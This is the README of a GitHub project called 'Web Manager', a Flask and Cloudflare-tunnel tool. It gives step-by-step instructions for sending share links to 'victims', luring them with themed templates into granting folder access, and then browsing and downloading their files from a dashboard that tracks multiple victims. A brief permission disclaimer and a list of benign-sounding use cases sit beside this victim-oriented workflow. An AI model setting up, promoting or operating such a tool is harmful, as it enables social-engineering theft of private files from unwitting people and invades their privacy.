# 🎮 WEB MANAGER - Professional Remote File Access Tool

> **Advanced web-based file sharing system with remote access via Cloudflare tunnels**

![Python](https://img.shields.io/badge/Python-3.8+-blue?style=flat-square)
![Flask](https://img.shields.io/badge/Flask-2.3+-green?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)

## 📋 Features

- ✅ **Generate Share URLs** - Create unique links via Cloudflare tunnels
- ✅ **Request File Access** - Browser-based file picker with permission request
- ✅ **Remote File Management** - Browse, download files from victim's device
- ✅ **Professional Dashboard** - Real-time monitoring and file control
- ✅ **Editable Templates** - Dark, Modern, Classic themes
- ✅ **Multiple Device Support** - Connect and manage multiple victims
- ✅ **Auto Error Fixing** - Built-in error handler and diagnostics
- ✅ **Zero Setup** - One-command startup with auto-installation
- ✅ **File Previews** - Icons for different file types
- ✅ **Batch Operations** - Download multiple files

## 🚀 Quick Start

### Prerequisites
- Python 3.8+
- Internet connection
- Git (optional)

### Installation

```bash
# Clone the repository
git clone https://github.com/mister-god/Web-Manager.git
cd Web-Manager

# Make start script executable
chmod +x start.sh

# Run the tool (auto-installs dependencies)
./start.sh
```

**Or with Python directly:**
```bash
python3 error_handler.py  # Auto-fix issues
python3 app.py             # Start server
```

## 📖 How to Use

### Step 1: Start the Dashboard
```bash
./start.sh
# or
python3 app.py
```

Your dashboard will be available at:
- 🌐 **Local**: `http://localhost:5000`
- 🌐 **Network**: `http://<your-ip>:5000`
- 🌐 **Public**: `https://<cloudflared-url>` (auto-generated)

### Step 2: Generate Share URL
1. Open dashboard: `http://localhost:5000`
2. Click **"📋 Copy URL"** or **"📱 Show QR Code"**
3. URL appears like: `https://xxxxx.trycloudflare.com/share/token123`

### Step 3: Send to Victim
Send the URL to your target device (any OS, any browser)

### Step 4: Victim Opens URL
1. Victim opens the URL
2. Selects a folder from their device
3. Clicks **"✅ ALLOW ACCESS"**

### Step 5: Access Files
1. Victim appears in your dashboard
2. Browse their folder contents
3. Download any files you want
4. Victim stays in real-time connection

## 🎨 Theme Templates

Add theme parameter to victim URL:

```
https://xxxxx.trycloudflare.com/share/token123?template=dark
https://xxxxx.trycloudflare.com/share/token123?template=modern
https://xxxxx.trycloudflare.com/share/token123?template=classic
```

| Template | Style | Best For |
|----------|-------|----------|
| `victim` (default) | Clean & Professional | General use |
| `dark` | Green Matrix Terminal | Tech users |
| `modern` | Blue Gradient | Modern devices |
| `classic` | Vintage Serif | Desktop users |

## 📁 Project Structure

```
Web-Manager/
├── app.py                    # Main Flask application
├── error_handler.py          # Auto-fix tool
├── cleanup.py                # Cleanup temporary files
├── requirements.txt          # Python dependencies
├── start.sh                  # One-command startup
├── templates/
│   ├── dashboard.html        # Controller dashboard
│   ├── victim.html           # Victim sharing page (default)
│   ├── dark.html             # Dark theme template
│   ├── modern.html           # Modern theme template
│   └── classic.html          # Classic theme template
├── uploads/                  # Temp file storage
└── README.md                 # This file
```

## 🔧 API Endpoints

### Dashboard API

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/get_share_url` | Generate new share URL |
| GET | `/api/get_devices` | List all connected devices |
| GET | `/api/get_files/<device_id>` | Get files from device |
| GET | `/api/download/<device_id>` | Download file from device |
| POST | `/api/remove_device/<device_id>` | Disconnect device |

### Victim API

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/set_folder` | Set selected folder |
| POST | `/api/grant_access` | Grant file access |
| POST | `/api/send_file_list` | Send file list |
| POST | `/api/revoke_access` | Revoke access |

## 🛠️ Troubleshooting

### Issue: "Port 5000 already in use"
```bash
# Kill process using port 5000
lsof -i :5000
kill -9 <PID>

# Or run on different port (edit app.py)
python3 app.py --port 5001
```

### Issue: "cloudflared not found"
```bash
# Auto-install with error handler
python3 error_handler.py

# Or manual install (Linux)
curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared
chmod +x cloudflared
sudo mv cloudflared /usr/local/bin/
```

### Issue: Clear all data
```bash
# Clean and reset
python3 cleanup.py reset
```

## 🔐 Security Considerations

⚠️ **Important:**
- This tool should only be used on **devices you own or have permission to test**
- Share URLs expire after inactivity
- Connections are logged locally
- Keep Cloudflared updated for security patches
- Never share credentials or tokens publicly

## 📦 Dependencies

```
flask==2.3.3          # Web framework
flask-cors==4.0.0     # Cross-origin support
psutil==5.9.5         # System utilities
requests==2.31.0      # HTTP library
cloudflared           # Tunnel client (auto-installed)
```

## 🎯 Common Use Cases

1. **Remote File Access** - Access files from any device remotely
2. **Cloud-Free Alternative** - No cloud service needed
3. **Network Testing** - Test file sharing between devices
4. **Remote Maintenance** - Access client files for support
5. **Security Testing** - Authorized penetration testing

## 📝 License

This project is licensed under the MIT License - see [LICENSE](LICENSE) file for details.

## ⭐ Support

- 📖 **Documentation**: See this README
- 🐛 **Issues**: Report on GitHub Issues
- 💬 **Discussions**: Use GitHub Discussions
- 🌟 **Like it?**: Please star ⭐ the repository!

## 🔗 Links

- GitHub: [https://github.com/mister-god/Web-Manager](https://github.com/mister-god/Web-Manager)
- Issues: [https://github.com/mister-god/Web-Manager/issues](https://github.com/mister-god/Web-Manager/issues)

---

**Made with ❤️ by mister-god**

*Last Updated: 2024*